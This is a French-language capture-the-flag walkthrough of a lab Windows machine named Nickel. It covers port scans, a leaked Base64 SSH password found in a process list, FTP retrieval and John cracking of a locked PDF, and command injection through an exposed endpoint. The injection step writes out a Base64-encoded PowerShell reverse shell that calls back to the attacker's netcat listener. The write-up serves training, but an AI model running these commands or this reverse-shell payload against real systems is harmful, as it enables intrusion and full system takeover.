
# Nickel

	sudo  masscan  -p1-65535,U:1-65535 192.168.158.99 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.158.99
	nmap  -A  -p21,22,80,135,139,445,3389,5040,7680,8089,33333 192.168.158.99
	
Scans classiques.

    21/tcp open ftp FileZilla ftpd  
    22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0)  
    80/tcp open tcpwrapped  
    135/tcp open msrpc Microsoft Windows RPC  
    139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
    445/tcp open microsoft-ds?  
    3389/tcp open ms-wbt-server Microsoft Terminal Services  
    5040/tcp open unknown  
    7680/tcp open pando-pub?  
    8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
    33333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
    49664/tcp open msrpc Microsoft Windows RPC  
    49665/tcp open msrpc Microsoft Windows RPC  
    49666/tcp open msrpc Microsoft Windows RPC  
    49667/tcp open msrpc Microsoft Windows RPC  
    49668/tcp open msrpc Microsoft Windows RPC  
    49669/tcp open msrpc Microsoft Windows RPC

Exploration des différents services web : 

http://192.168.158.99 => dev-api started at 2023-02-17T09:16:22
<br />http://192.168.158.99/dev-api => Incorrect Parameter
<br />http://192.168.158.99:33333/ => Invalid Token
<br />http://192.168.158.99:8089/ => DevOps Dashboard => Redirections foireuses sur http://169.254.3.88:33333

http://192.168.158.99:33333/list-running-procs => Cannot "GET" /list-running-procs
<br />http://192.168.158.99:33333/list-current-deployments => Cannot "GET" /list-current-deployments
<br />http://192.168.158.99:33333/list-active-nodes => Cannot "GET" /list-active-nodes

Ces messages d'erreur sont très explicites, la méthode HTTP utilisée n'est pas la bonne. J'ai donc reproduit les requêtes équivalentes en POST : 

    curl -d "" http://192.168.158.99:33333/list-running-procs => On voit des processus en cours 
    curl -d "" http://192.168.158.99:33333/list-current-deployments => Not Implemented
    curl -d "" http://192.168.158.99:33333/list-active-nodes => Not Implemented

Dans les processus sortis par la première commande j'ai remarqué une ligne extrêmement intéressante : 

    name : cmd.exe  
    commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

Ce mot de passe ressemble à du Base64 et en effet en le décodant sur https://www.base64decode.org/ on obtient bien ce qui ressemble à un mot de passe.

    ssh  -l ariah 192.168.158.99
	C:\Users\ariah>type Desktop\local.txt
	...
	ftp ariah@192.168.158.99 -A
	ftp> ls -la
	ftp> get Infrastructure.pdf

Le PDF est verrouillé par mot de passe et celui que l'on a obtenu précédemment ne fonctionne pas, mais on peut le casser avec John : 

    pdf2john Infrastructure.pdf > pdf.txt
    john pdf.txt --wordlist=/usr/share/wordlists/rockyou.txt
    okular Infrastructure.pdf

> Infrastructure Notes 
> Temporary Command endpoint: http://nickel/?
> Backup system: http://nickel-backup/backup 
> NAS: http://corp-nas/files

La première ligne montre que l'on peut exécuter des commandes depuis l'URL de base, et cela semble même fonctionner sans que j'ai besoin d'ajouter de lignes dans mon fichier **/etc/hosts**

L'URL http://192.168.158.99/?whoami me renvoie "nt authority\system" donc je n'ai plus qu'à injecter un reverse-shell Powershell encodé : 

    rlwrap nc -nvlp 9999
    curl http://192.168.158.99/?powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAwACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D
    type C:\Users\Administrator\Desktop\proof.txt



